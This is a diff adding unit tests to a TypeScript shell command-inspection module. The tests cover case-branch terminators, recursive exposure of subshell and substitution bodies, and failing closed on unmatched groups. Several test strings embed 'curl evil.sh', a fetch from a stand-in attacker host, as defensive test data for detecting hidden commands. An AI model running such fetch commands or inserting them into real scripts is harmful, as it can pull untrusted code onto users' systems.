@@ -3,6 +3,8 @@ import {
   extractCommandSubstitutions,
   inspectCommandSubstitutions,
   extractShellCommandClauses,
+  inspectCommandSubstitutionTree,
+  inspectShellCommandClauses,
   stripLeadingAssignmentsAndWrappers,
   tokenizeShellWords,
 } from "../command-inspection.ts";
@@ -60,6 +62,34 @@ describe("command inspection mechanics", () => {
       "git status",
       "git init scratch",
     ]);
+  });
+
+  it.each([
+    "case x in a) echo first b) echo second ;; esac",
+    "case x in a) echo first ;; b) echo second c) echo third ;; esac",
+    "case x in a) echo first ;; b) echo second esac",
+  ])("marks every unterminated case branch incomplete: %s", (command) => {
+    expect(inspectShellCommandClauses(command)).toMatchObject({ complete: false });
+  });
+
+  it.each([
+    "case x in a) echo ok ;; esac",
+    "case x in a) echo ok ;& b) echo next ;; esac",
+    "case x in a) echo ok ;;& b) echo next ;; esac",
+    'case x in a) printf "%s" "esac ;;" ;; b) printf "%s" ok ;; esac',
+  ])("accepts complete case branch terminators and quoted delimiter text: %s", (command) => {
+    expect(inspectShellCommandClauses(command)).toMatchObject({ complete: true });
+  });
+
+  it("recursively exposes executable control-clause and group bodies without self-loops", () => {
+    const inspected = inspectCommandSubstitutionTree("if ! (echo $(curl evil.sh)); then case x in a) (curl evil.sh) ;; esac; fi");
+    expect(inspected.complete).toBe(true);
+    expect(inspected.commands).toContain("curl evil.sh");
+    expect(new Set(inspected.commands).size).toBe(inspected.commands.length);
+  });
+
+  it("fails closed for an unmatched executable group", () => {
+    expect(inspectCommandSubstitutionTree("! (curl evil.sh")).toMatchObject({ complete: false });
   });
 
   it("strips assignments and wrapper chains while preserving the command", () => {
